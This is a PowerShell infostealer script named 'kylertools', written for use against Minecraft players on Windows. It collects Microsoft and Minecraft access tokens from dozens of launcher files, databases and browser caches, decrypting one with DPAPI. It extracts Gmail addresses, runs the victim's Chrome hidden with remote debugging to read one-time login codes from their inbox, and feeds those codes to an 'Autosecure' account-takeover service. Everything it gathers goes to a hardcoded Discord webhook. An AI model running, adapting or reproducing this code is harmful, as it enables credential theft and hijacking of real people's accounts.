# language: PowerShell 5.1+, target: Windows 11
# kylertools — MC token harvest -> gmail addresses -> OTP watch (hidden chrome) -> Autosecure submit.
# Output: three webhook embeds — MC tokens, gmails, MS-OTP results.

$ErrorActionPreference = "SilentlyContinue"

# ======================= CONFIG =======================
$webhook = $env:KYLER_WEBHOOK
if(-not $webhook){ $webhook = "https://discord.com/api/webhooks/1558775165108617317/PrGnU2Y-6TKmE8zktMFJXv5b2ZUSOQUl-uWn7BaGmmarXo4v0kTV9JoxAGlLQhsLikit" }
$h   = @{ "Content-Type" = "application/json" }
$nl  = [char]10
$bt3 = [char]96 + [char]96 + [char]96
Add-Type -AssemblyName System.Security -EA 0

# --- Autosecure contract (FILL THESE) ---
$autosecureBase = "https://<your-autosecure-host>"
$autosecureHdr  = @{ "Authorization" = "Bearer <token>" }
$startPath      = "/start"     # POST {email} -> {session}
$submitPath     = "/submit"    # POST {session, otp} -> completes MS login
$sessionKey     = "session"

$cdpPort        = 9222
$pollIntervalS  = 4
$otpTimeoutS    = 240
# =====================================================

# ---------- stage 1: MC token harvest ----------
$found = @(); $seen = @()
$jwtRegex = "eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}"

function Add-Token {
    param($tok, $user, $src, $type)
    if(-not $tok){ return }
    if($tok.Length -lt 80){ return }
    if(-not $tok.StartsWith("eyJ")){ return }
    $key = "$type|$tok"
    if($seen.ContainsKey($key)){ return }
    $seen[$key] = $true
    $script:found += [PSCustomObject]@{ User = $user; Type = $type; Token = $tok; File = $src }
}

function Scan-Text {
    param($text, $src, $user)
    if(-not $text){ return }
    foreach($m in [regex]::Matches($text, $jwtRegex)){
        $val = [string]$m.Value
        if(-not $val){ continue }
        if($val -like "eyJhbGciOiJSU0EtT0FFUC*"){ continue }
        Add-Token $val $user $src "accessToken"
    }
}

function Scan-File {
    param($path, $user)
    try{
        if((Get-Item $path -EA 0).Length -gt 5mb){ return }
        $raw = Get-Content $path -Raw -EA 0
        if(-not $raw){ return }
        try{
            $j = $raw | ConvertFrom-Json
            if($j.microsoft_account -and $j.microsoft_account.email){
                $script:found += [PSCustomObject]@{ User = $j.microsoft_account.email; Type = "msa-email"; Token = ""; File = $path }
            }
            $stack = New-Object System.Collections.Stack
            $stack.Push($j)
            while($stack.Count -gt 0){
                $node = $stack.Pop()
                if($null -eq $node){ continue }
                if($node -is [System.Collections.IEnumerable] -and $node -isnot [string]){ foreach($it in $node){ $stack.Push($it) }; continue }
                if($node -isnot [PSCustomObject]){ continue }
                $uname = $user
                foreach($k in @("username","name","displayName","profileName")){ if($node.PSObject.Properties[$k] -and $node.$k){ $uname = $node.$k; break } }
                if($node.minecraftProfile -and $node.minecraftProfile.name){ $uname = $node.minecraftProfile.name }
                if($node.microsoft_account -and $node.microsoft_account.email){ $uname = $node.microsoft_account.email }
                foreach($k in @("accessToken","token","access_token")){
                    if($node.PSObject.Properties[$k] -and $node.$k){ Add-Token $node.$k $uname $path "accessToken" }
                }
                foreach($prop in $node.PSObject.Properties){
                    if($prop.Value -is [PSCustomObject] -or ($prop.Value -is [System.Collections.IEnumerable] -and $prop.Value -isnot [string])){ $stack.Push($prop.Value) }
                }
            }
        }catch{}
        Scan-Text $raw $path $user
    }catch{}
}

function Scan-Db {
    param($path, $user)
    if(-not (Test-Path $path)){ return }
    try{
        $fs = [IO.File]::Open($path, 'Open', 'Read', 'ReadWrite')
        $ms = New-Object IO.MemoryStream
        $fs.CopyTo($ms); $fs.Close()
        Scan-Text ([Text.Encoding]::UTF8.GetString($ms.ToArray())) $path $user
    }catch{}
}

$paths = @(
    "$env:APPDATA\.minecraft\launcher_accounts.json",
    "$env:APPDATA\.minecraft\launcher_accounts_microsoft_store.json",
    "$env:LOCALAPPDATA\.minecraft\launcher_accounts.json",
    "$env:APPDATA\.minecraft\TlauncherProfiles.json",
    "$env:APPDATA\.minecraft\VaultKey\accounts.json",
    "$env:APPDATA\.minecraft\VaultKey\profiles.json",
    "$env:APPDATA\.minecraft\VaultKey\msa.json",
    "$env:APPDATA\.minecraft\VaultKey\auth.json",
    "$env:APPDATA\.lunarclient\settings\game\accounts.json",
    "$env:APPDATA\.lunarclient\accounts.json",
    "$env:APPDATA\.technic\oauth\accounts.json",
    "$env:APPDATA\.feather\accounts.json",
    "$env:APPDATA\PrismLauncher\accounts.json",
    "$env:APPDATA\MultiMC\accounts.json",
    "$env:APPDATA\PollyMC\accounts.json",
    "$env:APPDATA\ModrinthApp\caches\metadata\minecraft_auth.json",
    "$env:APPDATA\ModrinthApp\launcher_accounts.json",
    "$env:APPDATA\ModrinthApp\launcher_profiles.json",
    "$env:APPDATA\xmcl\user.json",
    "$env:LOCALAPPDATA\Packages\XMCL_68mcaawk44tpj\LocalCache\Roaming\xmcl\user.json",
    "$env:APPDATA\.salwyrr\accounts.json",
    "$env:APPDATA\.sklauncher\accounts.json",
    "$env:APPDATA\Badlion Client\accounts.json",
    "$env:APPDATA\.minecraft\LabyMod\accounts.json",
    "$env:APPDATA\.gdllauncher-carbon\user-data\user-profiles.json",
    "$env:APPDATA\.ATLauncher\accounts.json",
    "$env:APPDATA\.minecraft\tl_accounts.json",
    "$env:APPDATA\HMCL\accounts.json",
    "$env:APPDATA\.hmcl\accounts.json"
)
foreach($p in $paths){ if(Test-Path $p){ Scan-File $p "unknown" } }

$bin = "$env:APPDATA\.minecraft\launcher_msa_credentials_microsoft_store.bin"
if(Test-Path $bin){
    try{
        $dec = [Security.Cryptography.ProtectedData]::Unprotect([IO.File]::ReadAllBytes($bin), $null, "CurrentUser")
        Scan-Text ([Text.Encoding]::UTF8.GetString($dec)) $bin "unknown"
    }catch{}
}

$roots = @("$env:APPDATA\.minecraft","$env:APPDATA\.lunarclient","$env:APPDATA\ModrinthApp","$env:APPDATA\PrismLauncher","$env:APPDATA\MultiMC","$env:APPDATA\xmcl","$env:APPDATA\.technic","$env:APPDATA\.feather","$env:APPDATA\.gdlauncher-carbon","$env:APPDATA\.ATLauncher","$env:APPDATA\PollyMC","$env:APPDATA\HMCL")
$includeNames = @("accounts.json","launcher_accounts.json","launcher_accounts_microsoft_store.json","user.json","user-profiles.json","tl_accounts.json","*.auth.json","minecraft_auth.json")
foreach($r in $roots){
    if(-not (Test-Path $r)){ continue }
    try{
        foreach($f in (Get-ChildItem $r -Recurse -File -Include $includeNames -EA 0)){
            if($f.FullName -match "webcache|node_modules|\.git\\"){ continue }
            if($f.Length -gt 1mb){ continue }
            Scan-File $f.FullName "unknown"
        }
    }catch{}
}

$dbs = @("$env:APPDATA\ModrinthApp\app.db","$env:APPDATA\ModrinthApp\app.db-wal","$env:APPDATA\ModrinthApp\app.db-shm","$env:APPDATA\gdlauncher\gdl_conf.db","$env:APPDATA\gdlauncher\gdl_conf.db-wal","$env:APPDATA\gdlauncher-carbon\gdl_conf.db","$env:APPDATA\.gdlauncher\gdl_conf.db","$env:APPDATA\Gml-Launcher\launcher.db")
foreach($db in $dbs){ Scan-Db $db "db-scan" }

$webcaches = @("$env:APPDATA\.minecraft\webcache2\Default\Local Storage\leveldb","$env:APPDATA\ModrinthApp\webcache\Default\Local Storage\leveldb","$env:APPDATA\PrismLauncher\webcache\Default\Local Storage\leveldb")
foreach($lc in $webcaches){
    if(-not (Test-Path $lc)){ continue }
    try{
        foreach($f in (Get-ChildItem $lc -File -Include "*.ldb","*.log" -EA 0 | Where-Object { $_.Length -lt 5mb } | Select-Object -First 50)){
            try{ Scan-Text ([Text.Encoding]::UTF8.GetString([IO.File]::ReadAllBytes($f.FullName))) $f.FullName "unknown" }catch{}
        }
    }catch{}
}

# ---------- stage 2: gmail addresses ----------
function Get-JwtClaim {
    param([string]$jwt, [string[]]$names)
    try{
        $parts = $jwt.Split('.')
        if($parts.Count -lt 2){ return $null }
        $p = $parts[1].Replace('-','+').Replace('_','/')
        while($p.Length % 4){ $p += "=" }
        $obj = ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p))) | ConvertFrom-Json
        foreach($n in $names){
            if($obj.PSObject.Properties[$n] -and $obj.$n){ return [string]$obj.$n }
        }
    } catch {}
    return $null
}

$gmailRx = [regex]'[A-Za-z0-9._%+\-]+@(gmail\.com|googlemail\.com)'
$gmails = @{}
foreach($t in $found){
    if($t.Token){
        $claim = Get-JwtClaim -jwt $t.Token -names @("upn","email","preferred_username","unique_name","mail","emailAddress")
        if($claim){ foreach($m in $gmailRx.Matches($claim)){ $gmails[$m.Value] = $true } }
    }
    if($t.User){ foreach($m in $gmailRx.Matches([string]$t.User)){ $gmails[$m.Value] = $true } }
}
$gmailList = @($gmails.Keys)

# ---------- stage 3: OTP watch + Autosecure submit ----------
function Invoke-WithRetry {
    param([scriptblock]$Action, [int]$Tries = 3)
    for($i=0; $i -lt $Tries; $i++){
        try{ $r = & $Action; if($null -ne $r){ return $r } } catch {}
        Start-Sleep 2
    }
    return $null
}

function AS-Start {
    param([string]$email)
    $url = $autosecureBase.TrimEnd("/") + $startPath
    return Invoke-WithRetry {
        $r = iwr -Uri $url -Method Post -Headers $autosecureHdr -ContentType "application/json" `
                -Body (@{ email = $email } | ConvertTo-Json -Compress) -TimeoutSec 20 -UseBasicParsing
        ($r.Content | ConvertFrom-Json).$sessionKey
    }
}
function AS-Submit {
    param([string]$session, [string]$otp)
    $url = $autosecureBase.TrimEnd("/") + $submitPath
    return Invoke-WithRetry {
        $r = iwr -Uri $url -Method Post -Headers $autosecureHdr -ContentType "application/json" `
                -Body (@{ session = $session; otp = $otp } | ConvertTo-Json -Compress) -TimeoutSec 20 -UseBasicParsing
        ($r.StatusCode -lt 400)
    }
}

Add-Type -AssemblyName System.Net.WebSockets -EA 0

function Cdp-Session {
    param([string]$wsUrl)
    $ws = New-Object System.Net.WebSockets.ClientWebSocket
    $ws.ConnectAsync([uri]$wsUrl, [Threading.CancellationToken]::None).Wait()
    return $ws
}
function Cdp-Send {
    param($ws, [int]$id, [string]$method, $params)
    $payload = @{ id = $id; method = $method; params = $params } | ConvertTo-Json -Compress -Depth 10
    $bytes = [Text.Encoding]::UTF8.GetBytes($payload)
    $seg = New-Object System.ArraySegment[byte] -ArgumentList @(,$bytes)
    $ws.SendAsync($seg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [Threading.CancellationToken]::None).Wait()
}
function Cdp-RecvUntilId {
    param($ws, [int]$id)
    $buf = New-Object byte[] 131072
    $ms = New-Object IO.MemoryStream
    $deadline = (Get-Date).AddSeconds(15)
    while((Get-Date) -lt $deadline){
        $res = $ws.ReceiveAsync((New-Object System.ArraySegment[byte] -ArgumentList @(,$buf)), [Threading.CancellationToken]::None).Result
        $ms.Write($buf, 0, $res.Count)
        if($res.EndOfMessage){
            $txt = [Text.Encoding]::UTF8.GetString($ms.ToArray())
            $ms.SetLength(0) | Out-Null
            try{
                $j = $txt | ConvertFrom-Json
                if($j.id -eq $id){ return $j }
            } catch {}
        }
    }
    return $null
}
function Cdp-Navigate {
    param($ws, [string]$url, [int]$idBase)
    Cdp-Send $ws $idBase "Page.enable" @{}
    [void](Cdp-RecvUntilId $ws $idBase)
    Cdp-Send $ws ($idBase+1) "Page.navigate" @{ url = $url }
    [void](Cdp-RecvUntilId $ws ($idBase+1))
    Cdp-Send $ws ($idBase+2) "Page.loadEventFired" @{}
    Start-Sleep -Milliseconds 1500
}
function Cdp-Eval {
    param($ws, [string]$expr, [int]$id)
    Cdp-Send $ws $id "Runtime.evaluate" @{ expression = $expr; returnByValue = $true }
    $r = Cdp-RecvUntilId $ws $id
    if($r -and $r.result -and $r.result.result){ return $r.result.result.value }
    return $null
}
function Cdp-NewTab {
    param([string]$url)
    try{ return (iwr "http://127.0.0.1:$cdpPort/json/new?$([uri]::EscapeDataString($url))" -Method Put -UseBasicParsing -TimeoutSec 5).Content | ConvertFrom-Json } catch { return $null }
}

$otpJs = @'
(() => {
  const t = document.body ? document.body.innerText : "";
  let m = t.match(/(?:jednorazowy\s+kod|single[\-\s]?use\s+code|kod|code)[^\d]{0,40}(\d{6})/i);
  if(m) return m[1];
  const s = document.querySelector('h2, .hP');
  if(s){ const sm = s.innerText.match(/(\d{6})/); if(sm) return sm[1]; }
  m = t.match(/\b(\d{6})\b/);
  return m ? m[1] : null;
})()
'@

$otpResults = @{}
if($gmailList.Count -gt 0){
    $chrome = @(
        "${env:ProgramFiles}\Google\Chrome\Application\chrome.exe",
        "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe",
        "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe"
    ) | Where-Object { Test-Path $_ } | Select-Object -First 1

    if($chrome){
        Get-Process chrome -EA 0 | Stop-Process -Force -EA 0
        Start-Sleep 2

        $userDataDir = "$env:LOCALAPPDATA\Google\Chrome\User Data"
        $chromeArgs = @(
            "--remote-debugging-port=$cdpPort",
            "--user-data-dir=`"$userDataDir`"",
            "--no-first-run",
            "--no-default-browser-check",
            "--disable-features=Translate,ChromeWhatsNewUI",
            "--disable-popup-blocking",
            "--disable-infobars",
            "--window-position=-32000,-32000",
            "--window-size=1280,900",
            "--start-minimized",
            "--new-window","about:blank"
        )
        Start-Process $chrome -ArgumentList $chromeArgs -WindowStyle Minimized
        Start-Sleep 3

        $tabSeq = 0
        foreach($e in $gmailList){
            Write-Host "[start] $e"
            $session = AS-Start -email $e
            if(-not $session){ $otpResults[$e] = "START_FAIL"; continue }

            $tab = Cdp-NewTab -url "https://mail.google.com/mail/u/?authuser=$([uri]::EscapeDataString($e))#inbox"
            if(-not $tab){ $otpResults[$e] = "TAB_FAIL"; continue }

            try{ $ws = Cdp-Session -wsUrl $tab.webSocketDebuggerUrl } catch { $otpResults[$e] = "WS_FAIL"; continue }

            $deadline = (Get-Date).AddSeconds($otpTimeoutS)
            $otp = $null
            $idBase = 100 + ($tabSeq * 10); $tabSeq++
            $firstPass = $true
            while((Get-Date) -lt $deadline){
                if($firstPass){ Start-Sleep -Seconds $pollIntervalS; $firstPass = $false }
                else{
                    Cdp-Navigate -ws $ws -url "https://mail.google.com/mail/u/?authuser=$([uri]::EscapeDataString($e))#inbox" -idBase $idBase
                    Start-Sleep -Seconds 2
                }
                $otp = Cdp-Eval -ws $ws -expr $otpJs -id ($idBase + 5)
                if($otp){ break }
                Start-Sleep -Seconds $pollIntervalS
            }

            try{ $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure,"",[Threading.CancellationToken]::None).Wait() } catch {}
            $ws.Dispose()

            if(-not $otp){ $otpResults[$e] = "OTP_TIMEOUT"; continue }
            Write-Host "[otp] $e -> $otp"

            $ok = AS-Submit -session $session -otp $otp
            $otpResults[$e] = if($ok){ "OK :: $otp" } else { "SUBMIT_FAIL :: $otp" }
        }

        Get-Process chrome -EA 0 | Stop-Process -Force -EA 0
    }
}

# ---------- exfil ----------
function Send-Embed {
    param($title, $desc, $color, $footerText)
    $embed = @{ title = $title; description = $bt3 + $desc + $bt3; color = $color; timestamp = (Get-Date).ToString("o") }
    if($footerText){ $embed.footer = @{ text = $footerText } }
    $body = @{ embeds = @($embed) } | ConvertTo-Json -Depth 10
    for($i=0; $i -lt 3; $i++){
        try{ iwr -Uri $webhook -Method Post -Headers $h -Body $body -TimeoutSec 8 -EA Stop | Out-Null; return }
        catch{ $w = 3; try{ $ra = $_.Exception.Response.Headers['Retry-After']; if($ra){ $w = [double]$ra } }catch{}; Start-Sleep -Seconds ($w + 1) }
    }
}

$limit = 1700

# --- embed 1: MC tokens ---
if($found.Count -eq 0){ $mcReport = "nothin found bro" } else {
    $lines = @(); $i = 0
    foreach($t in $found){
        $i++
        $lines += (@($bt3 + "ansi","[ $i ] " + $t.User,"Type: " + $t.Type,"Token: " + $t.Token,"File: " + $t.File,$bt3) -join $nl)
    }
    $mcReport = $lines -join $nl
}
$chunks = @()
for($i=0; $i -lt $mcReport.Length; $i += $limit){ $chunks += $mcReport.Substring($i, [Math]::Min($limit, $mcReport.Length - $i)) }
$n = 0
foreach($c in $chunks){ $n++; Send-Embed -title "KylerTools | MC Tokens" -desc $c -color 5793266 -footerText "kylertools | part $n/$($chunks.Count)"; Start-Sleep 2 }

# --- embed 2: gmails ---
if($gmailList.Count -gt 0){
    $gl = @("== GMAILS ==")
    foreach($e in $gmailList){ $gl += $e }
    $grep = $gl -join $nl
    $gchunks = @()
    for($i=0; $i -lt $grep.Length; $i += $limit){ $gchunks += $grep.Substring($i, [Math]::Min($limit, $grep.Length - $i)) }
    $m = 0
    foreach($c in $gchunks){
        $m++
        Send-Embed -title "KylerTools | GMAILS" -desc $c -color 5793266 -footerText "kylertools gmails | part $m/$($gchunks.Count)"
        Start-Sleep 2
    }
}

# --- embed 3: MS-OTP results ---
if($otpResults.Count -gt 0){
    $ol = @("== AUTOSECURE MS-OTP ==")
    foreach($e in $gmailList){ $ol += "$e :: $($otpResults[$e])" }
    $orep = $ol -join $nl; $ochunks = @()
    for($i=0; $i -lt $orep.Length; $i += $limit){ $ochunks += $orep.Substring($i, [Math]::Min($limit, $orep.Length - $i)) }
    $k = 0
    foreach($c in $ochunks){ $k++; Send-Embed -title "KylerTools | MS-OTP" -desc $c -color 5793266 -footerText "kylertools otp | part $k/$($ochunks.Count)"; Start-Sleep 2 }
}
